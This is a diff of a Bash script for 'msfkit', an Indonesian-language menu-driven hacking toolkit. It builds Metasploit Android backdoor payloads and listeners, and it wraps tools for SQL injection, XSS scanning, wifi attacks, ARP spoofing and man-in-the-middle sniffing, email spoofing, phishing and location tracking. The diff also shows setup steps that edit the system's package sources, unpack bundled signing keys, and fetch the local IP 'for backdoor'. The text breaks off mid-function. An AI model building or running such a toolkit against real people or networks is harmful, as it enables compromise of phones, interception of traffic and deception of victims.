@@ -1,8 +1,9 @@
+
 #!/bin/bash
 # created by K1M4K-ID
 # sertakan nama author jika ingin merecode, ethical hacking!!
-# tools multi function
-# msfkit is a framework that creates & generates & embeds apk payloads to penetrate android platform
+# tools multi function, gunakan dengan bijak :D
+# msfkit is a framework that creates & Generates & embeds apk payloads to penetrate android platform
 # update terbaru tools msfkit, open source
 # terima kasih.
 
@@ -16,6 +17,7 @@ tan=$(date +"%d")
 tim=$(date +"%T")
 yer=$(date +"%Y")
 waktu=$(printf "\033[31;1m$bul \033[31;1m$tan \033[37;1m$tim \033[31;1m$yer")
+tput civis
 clear
 
 # var untuk aplikasi
@@ -33,23 +35,24 @@ echo ""
 
 # banner tools ini.
 baner(){
-printf "\033[32;1m""""
-┌┬┐┌─┐┌─┐┬┌─┬┌┬┐ \033[37;1m author  :\033[31;1m K1M4K-ID
-│││└─┐├┤ ├┴┐│ │  \033[37;1m support :\033[31;1m Invisible Protect Team
-┴ ┴└─┘└  ┴ ┴┴ ┴  \033[37;1m date    : $waktu
-_________________________________________________________________
-|                                                               |
-|     MSF-KIT => Hacking Tools, Exploit, Phising, Spoofing      |
-|_______________________________________________________________|
-|                                                               |
-|                                                               |
-|                                                               |
-|                                                               |
-|_______________________________________________________________|
+printf "\033[31;3m""""
+
+   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄█   ▄█▄  ▄█      ███     
+ ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀ ███  ▀█████████▄ 
+ ███   ███   ███   ███    █▀    ███    █▀    ███▐██▀   ███▌    ▀███▀▀██  
+ ███   ███   ███   ███         ▄███▄▄▄      ▄█████▀    ███▌     ███   ▀  \033[37;1m Version :\033[31;1m V.2\033[37;3m
+ ███   ███   ███ ▀███████████ ▀▀███▀▀▀     ▀▀█████▄    ███▌     ███      \033[37;1m Code    :\033[31;1m <./K1M4K-ID>\033[37;3m
+ ███   ███   ███          ███   ███          ███▐██▄   ███      ███      \033[37;1m support :\033[31;1m Cari Di Gugel\033[37;3m     
+ ███   ███   ███    ▄█    ███   ███          ███ ▀███▄ ███      ███     
+  ▀█   ███   █▀   ▄████████▀    ███          ███   ▀█▀ █▀      ▄████▀   
+                                             ▀                          
+\033[32;1m            		./Exploit~Droid
+\033[31;1m   		 Sniffing, Spoofing, Mitm Attack
+\033[37;1m	           Social Engineering Attack
 """
 }
 
-# animasi, spiner
+# animasi, 
 spiner(){
 bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 barlength=${#bar}
@@ -89,6 +92,10 @@ function remove()
     cd $path/Malware && rm -fr * >> /dev/null 2>&1
 }
 
+function reset(){
+tput cnorm
+}
+
 trap ctrl_c INT
 ctrl_c(){
 clear
@@ -97,7 +104,7 @@ printf "\033[34;1m[\033[33;1mCTRL+C\033[34;1m]\033[34;1m Detected, Trying To Exi
 sleep 1
 printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m Stop service . . . initialize \033[37;1m\n"
 sleep 1
-remove
+reset remove
 sleep 1
 printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m Thank you, for use this tools :) \033[37;1m\n"
 sleep 1
@@ -107,7 +114,20 @@ exit
 
 # check dependencies
 function dependencies(){
-if [ -f /usr/bin/msfconsole ]; then
+if [ -f /etc/apt/sources.list.bckp ]; then
+    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m repository has been updates!\n"
+    else
+    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m add repository!\n"
+    cp /etc/apt/sources.list /etc/apt/sources.list.bckp
+    sleep 0.025
+    echo "deb http://http.kali.org/kali kali-last-snapshot main contrib non-free" >> /etc/apt/sources.list
+    printf "\033[37;1m[\033[31;1m*\033[37;1m]\033[37;1m updates repository!\n"
+    apt-get update;clear
+    fi
+    sleep 0.025
+    
+    
+if [ -f /usr/bin/msfconsole ]; then	
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m metasploit is already exists!\n"
     else
     printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing metasploit!\n"
@@ -140,23 +160,30 @@ if [ -f /usr/bin/python3 ]; then
 	  sleep 0.025
 
 if [ -f /usr/local/bin/apktool ]; then
-    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apktool is already exists!\n"
+    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apktool is ${GREEN}Installed.\n"
     else
     printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apktool!\n"
-    cd $path && wget https://raw.githubusercontent.com/K1M4K-ID/support/master/apktool > /dev/null 2>&1 && chmod +x apktool && mv apktool /usr/local/bin
-    cd $path && wget https://github.com/K1M4K-ID/support/blob/master/apktool.jar?raw=true > /dev/null 2>&1 && mv -f apktool.jar?raw=true apktool.jar && mv apktool.jar /usr/local/bin
-
+    wget --no-check-certificate "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" -O /usr/local/bin/apktool && chmod +x /usr/local/bin/apktool
+    wget --no-check-certificate "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.6.1.jar" -O /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool.jar
     fi
     sleep 0.025
 
 if [ -f /usr/bin/java ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m java is already exists!\n"
     else
-    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing java!\n"
+    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing java 11!\n"
     sudo apt-get install openjdk-11-jdk -y
     apt-get install openjdk-11-jre -y
-    apt-get install openjdk-8-jdk -y
-    apt-get install openjdk-8-jre -y
+    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing java 8!\n"
+    apt-get install nvidia-openjdk-8-jre -y;export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-amd64";update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java" 1177
+    fi
+    sleep 0.025
+
+if [ -f /usr/sbin/dsniff ]; then
+    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m arpspoof is already exists!\n"
+    else
+    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing arpspoof!\n"
+    sudo apt-get install dsniff -y
     fi
     sleep 0.025
 
@@ -175,13 +202,23 @@ if [ -f /usr/bin/zipalign ]; then
     apt-get install zipalign -y
     fi
     sleep 0.025
+    
+if [ -f Malware/.android/sign.jar ]; then
+        printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m config is already exists!\033[31;1m\n"
+        else
+        printf "\033[37;1m[\033[31;1mx\033[37;1m] config tidak ditemukan, mengkonfigurasi sekarang..\033[31;1m\n"
+        if [ ! -d ".android"  ]; then
+        mkdir -p Malware/.android 
+        mv -f key.tar.gz Malware/.android;cd Malware/.android;tar -xvf key.tar.gz &> /dev/null;rm -r key.tar.gz;cd keys;mv -f * ..;cd -;rm -r keys &> /dev/null
+        fi
+        sleep 0.025s
+fi
 
 if [ -f /usr/bin/adb ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m adb is already exists!\n"
     else
     printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing adb!\n"
-		apt-get install adb -y
-		#cd $path && wget https://github.com/K1M4K-ID/adb-1.0.41/blob/main/adb.zip?raw=true > /dev/null 2>&1 && mv adb.zip?raw=true adb.zip && unzip adb.zip > /dev/null
+	apt-get install adb -y
     fi
     sleep 0.025
 
@@ -199,15 +236,7 @@ if [ -f /usr/bin/scrcpy ]; then
     printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m scrcpy is already exists!\n"
     else
     printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing scrcpy!\n"
-		#sudo apt update -y
-		sudo apt-get install scrcpy -y
-		#sudo apt install snapd -y
-		#sudo snap install core -y
-		#sudo systemctl unmask snapd -y
-		#sudo systemctl enable --now snapd -y
-		#sudo snap install scrcpy -y
-		#echo "alias scrcpy='/snap/bin/scrcpy'" >> ~/.zshrc
-
+	sudo apt-get install scrcpy -y
     fi
     sleep 0.025
 
@@ -219,61 +248,29 @@ if [ -d $path/data/out ]; then
 
 fi
 
-#
-#if [ -f /usr/bin/scrcpy ]; then
-#    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m scrcpy is already exists!\n"
-#    else
-#    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing scrcpy!\n"
-#    apt-get install scrcpy -y
-#    fi
-#    sleep 0.025
-}
-
-# check metasploit framework dan instalasi secara otomatis
-function checkmetasploit(){
-        which msfconsole > /dev/null 2>&1
-        if [ "$?" -eq "0" ]
-        then
-        printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m metasploit . . . . . . . . . . . . . . . . . . . . .\033[32;1mfound"
-        sleep 1
-        which msfconsole > /dev/null 2>&1
-        else
-        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m metasploit . . . . . . . . . . . . . . . . . . .\033[31;1mnot found"
-        sleep 1
-        printf "\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m metasploit tidak tersedia . . installing metasploit"
-        sleep 1
-        cekon
-        printf "\033[31;1m[\033[34;1m✔\033[31;1m]\033[37;1m installing metasploit-framework please wait\033[31;1m"
-        sleep 1
-        printf "\033[31;1m[\033[34;1m✔\033[31;1m]\033[37;1m mohon tunggu beberapa saat . . jangan tutup terminal"
-        sleep 1
-        sudo apt-get install metasploit-framework -y
-        echo
-        printf "\033[31;1m[\033[34;1m✔\033[31;1m]\033[37;1m installing metasploit-framework succesfully\033[31;1m"
-        sleep 1
-        fi
 }
 
 # menu
 function menu(){
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m information gathering & osint\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m information gathering & osint\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m exploit attack metasploit\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m exploit attack metasploit\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m web attack xss & sql injection\n"
+        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m web attack xss & sql injection\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m wifi attack\n"
+        printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m wifi attack\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m5\033[31;1m]\033[37;1m sniffing & manInThemidle attack\n"
+        printf "\033[31;1m\t[\033[32;1m5\033[31;1m]\033[37;1m sniffing & manInThemidle attack\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m6\033[31;1m]\033[37;1m social enggineering\n"
+        printf "\033[31;1m\t[\033[32;1m6\033[31;1m]\033[37;1m social enggineering\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m exit\n\n"
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m exit\n\n"
         sleep 0.025
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         echo
         sleep 0.025
 }
+
 
 # menu jika user xyz 1
 function information_gathering(){
@@ -281,26 +278,26 @@ function information_gathering(){
 	baner
 	echo
 	echo
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m sosial media recon [\033[32;1m instagram, facebook, twiter\033[37;1m ]\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m sosial media recon [\033[32;1m instagram, facebook, twiter\033[37;1m ]\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m osint search by name\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m osint search by name\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m osint instagram\n"
+        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m nmap detection scanning host\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m nmap full scanning host\n"
+        printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m nmap scanning http sql-injection\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m5\033[31;1m]\033[37;1m nmap scanning wifi\n"
+        printf "\033[31;1m\t[\033[32;1m5\033[31;1m]\033[37;1m nmap scanning wifi\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m6\033[31;1m]\033[37;1m whois lookup recon\n"
+        printf "\033[31;1m\t[\033[32;1m6\033[31;1m]\033[37;1m whois lookup recon\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m7\033[31;1m]\033[37;1m DNS lookup recon\n"
+        printf "\033[31;1m\t[\033[32;1m7\033[31;1m]\033[37;1m DNS lookup recon\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m8\033[31;1m]\033[37;1m search directory\n"
+        printf "\033[31;1m\t[\033[32;1m8\033[31;1m]\033[37;1m search directory\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\n"
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\n"
         sleep 0.025
         echo
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         echo
 }
@@ -311,13 +308,13 @@ function metasploit(){
     baner
     echo
     echo
-				printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m create payload android\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m create payload android\033[31;1m\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m create listerner\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m create listerner\033[31;1m\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
         sleep 0.025
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         printf '\033[31;1m'
         sleep 0.025
         echo
@@ -329,13 +326,17 @@ function web_attack(){
     baner
     echo
     echo
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m sql-injection  \033[31;1m(\033[32;1mfor scanning,attack and get database\033[31;1m)\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m sql-injection  \033[31;1m(\033[32;1mfor scanning,attack and get database\033[31;1m)\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m xss-scanning \033[31;1m(\033[32;1mfor scanning xss\033[31;1m)\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m xss-scanning \033[31;1m(\033[32;1mfor scanning xss\033[31;1m)\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m back\033[31;1m\n\n"
+        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m dirsearch \033[31;1m(\033[32;1mfor find hidden directory\033[31;1m)\n"
         sleep 0.025
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        printf "\033[31;1m\t[\033[32;1m4\033[31;1m]\033[37;1m subdomain enumeration \033[31;1m(\033[32;1mfor find subdomain\033[31;1m)\n"
+        sleep 0.025
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m back\033[31;1m\n\n"
+        sleep 0.025
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         printf '\033[31;1m'
 
@@ -343,13 +344,13 @@ function web_attack(){
 
 # user input 4 sniffing & MITM
 function sadap(){
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m fluxion (hacking wifi with captive portal - fake ssid)\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m airgeddon (hacking wifi with captive portal - fake ssid)\033[31;1m\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m evillimiter (hacking wifi - kill wifi)\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m evillimiter (hacking wifi - kill wifi)\033[31;1m\n"
         sleep 0.025
-				printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
         sleep 0.025
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         printf '\033[31;1m'
 
@@ -357,17 +358,31 @@ function sadap(){
 
 # user input 5 MITM
 function mitm(){
-        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m bettercap (sniffing networking)\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m bettercap (sniffing networking)\033[31;1m\n"
         sleep 0.025
-        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m MitM proxy (sniffing - http/https)\033[31;1m\n"
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m MitM proxy (sniffing - http/https)\033[31;1m\n"
         sleep 0.025
-				printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
         sleep 0.025
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
         sleep 0.025
         printf '\033[31;1m'
 }
 
+# user input 6 social engineering
+function soceng(){
+        printf "\033[31;1m\t[\033[32;1m1\033[31;1m]\033[37;1m email spoofing \033[31;1m(\033[32;1mBeta\033[31;1m)\n"
+        sleep 0.025
+        printf "\033[31;1m\t[\033[32;1m2\033[31;1m]\033[37;1m phising attack \033[31;1m(\033[32;1mBeta\033[31;1m)\n"
+        sleep 0.025
+        printf "\033[31;1m\t[\033[32;1m3\033[31;1m]\033[37;1m tracking location \033[31;1m(\033[32;1mBeta\033[31;1m)\n"
+        sleep 0.025
+        printf "\033[31;1m\t[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
+        sleep 0.025
+        read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+        sleep 0.025
+        printf '\033[31;1m'
+}
 
 
 
@@ -400,21 +415,15 @@ printf '\033[31;1m'"""
 # information gathering
 function search(){
 	printf '\033[31;1m'
-	spiner
 	echo
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
-        sleep 0.025
-        spiner
+        sleep 2s
         clear
         bash $path/.data/recon/userrecon.sh
         mv *.txt data/out > /dev/null 2>&1
         printf '\033[31;1m'
-        spiner
-        echo
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
         printf '\033[31;1m'
-        spiner
-        echo
         sleep 0.025
 
 }
@@ -422,110 +431,35 @@ function search(){
 # information gathering
 function osint(){
 	printf '\033[31;1m'
-	spiner
 	echo
-        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
-        sleep 0.025
-        spiner
+        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[37;1m\n"
+        sleep 2s
         clear
-        python3 $path/.data/osint/osints.py
+        python $path/.data/osint/osints.py
         printf '\033[31;1m'
-        spiner
-        echo
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
-        printf '\033[31;1m'
-        spiner
+        printf '\033[37;1m'
         echo
         sleep 0.025
 
 }
 
-# information gathering
-function osintinstagram(){
-    clear
-    baner
-    echo
-    spiner
-    echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1msetup osint, set username && password\033[31;1m\n"
-    sleep 0.025
-    spiner
-    echo
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrunning osint\033[31;1m\n"
-    sleep 0.025
-    spiner
-    echo
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
-    sleep 0.025
-    spiner
-    echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
-    sleep 0.025
-    printf '\033[31;1m'
-    spiner
-    echo
-        if [ $xyz = "1"  ];
-        then
-
-                if [[ -d $path/.data/Osint ]]; then
-                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mOsint already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-                spiner
-                echo
-                sleep 2
-                clear
-                else
-                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m Osint \033[31;1mnot found\033[37;1m, installing Osint!\n"
-                cd $path/.data > /dev/null
-                git clone https://github.com/Datalux/Osintgram > /dev/null 2>&1;mv -f Osintgram Osint > /dev/null 2>&1
-                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
-                printf '\033[31;1m'
-                spiner
-                echo
-
-                fi
-
-        cd $path/.data/Osint && make setup && cd $path/.data/Osint && pip3 install -r requirements.txt
-        osintinstagram
-        sleep 2
-
-        elif [ $xyz = "2"  ];
-        then
-        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> contoh_\n"
-        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
-        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target : "'\033[34;1m')" target
-        cd $path/.data/Osint && python3 main.py $target
-        sleep 3
-        osintinstagram
-
-        elif [ $xyz = "0"  ];
-        then
-        run_lainya
-
-        else
-        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
-        sleep 2
-        osintinstagram
-        fi
-}
 
 # menu user memilih scan  nmap host root
 function nmproot(){
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
     sleep 0.025
-    spiner
     echo
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 74.125.24.102\n"
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
     read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
     printf '\033[31;1m'
-    spiner
     printf '\033[37;1m'
     echo
     nmap -v -sS -Pn -O $target
     sleep 0.025
     printf '\033[31;1m'
-    spiner
     echo
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
         echo
@@ -536,27 +470,55 @@ function nmproot(){
                 nmproot
 
                 else [ $scan != "y" ]
-
+		run_information
                 fi
         done
 }
+
+# menu user memilih scan  nmap host root
+function nmpsql(){
+    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
+    sleep 0.025
+    echo
+    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> testphp.vulnweb.com\n"
+    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 44.228.249.3\n"
+    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
+    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
+    printf '\033[31;1m'
+    printf '\033[37;1m'
+    echo
+    nmap -T4 -sV --script http-sql-injection $target -v
+    sleep 0.025
+    printf '\033[31;1m'
+    echo
+        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
+        echo
+        while true
+        do
+                if [ $scan = "y"  ];
+                then
+                nmproot
+
+                else [ $scan != "y" ]
+		run_information			
+                fi
+        done
+}
+
 
 # menu user memilih scan nmap wifi
 function nmpwifi(){
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
     sleep 0.025
-    spiner
     echo
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 192.168.1.1/24\n"
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
     read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
     printf '\033[31;1m'
-    spiner
     printf '\033[37;1m'
     echo
     nmap -sP $target
     printf '\033[31;1m'
-    spiner
     sleep 0.025
     echo
             read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
@@ -578,19 +540,16 @@ wgetfind()
 {
   printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
   sleep 0
-  spiner
   echo
   printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> paypal.com\n"
   printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
   read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" url
   printf '\033[31;1m'
-  spiner
   printf '\033[37;1m'
   echo
   wget -qO- $url | tr \" \\n | grep -Eio "https?://[^;),'\\]+" | sort -u | nl
   sleep 0
   printf '\033[31;1m'
-  spiner
   echo
           read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
           echo
@@ -610,20 +569,15 @@ wgetfind()
 function whs(){
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
     sleep 0.025
-    spiner
     echo
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
     read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
     printf '\033[31;1m'
-    spiner
-    printf '\033[37;1m'
     echo
     whois $target
     sleep 0.025
     printf '\033[31;1m'
-    spiner
-    echo
     read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
     echo
         while true
@@ -642,19 +596,14 @@ function whs(){
 function dns(){
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
     sleep 0.025
-    spiner
     echo
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
     printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
     read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
     printf '\033[31;1m'
-    spiner
-    printf '\033[37;1m'
-    echo
     dnsenum $target
     sleep 0.025
     printf '\033[31;1m'
-    spiner
     echo
         read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
         echo
@@ -673,8 +622,8 @@ function run_information(){
     case $xyz in
         1) search;;
         2) osint;;
-        3) osintinstagram;;
-        4) nmproot;;
+        3) nmproot;;
+        4) nmpsql;;
         5) nmpwifi;;
         6) whs;;
         7) dns;;
@@ -689,44 +638,24 @@ function run_information(){
 
 # runner numb 2
 # exploit metasploit
-
+eth0_ip=$(ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}')
+wlan0_ip=$(ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}')
 # fungsi seting ip dan port
 function sets(){
         clear
         baner
         printf '\033[31;1m'
         echo
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
-        spiner
-        echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
-        spiner
-        echo
-        echo
-        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
-        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
-        spiner
-        echo
-        echo
-        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
-        echo
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] ip Backdoor\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda : $eth0_ip  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
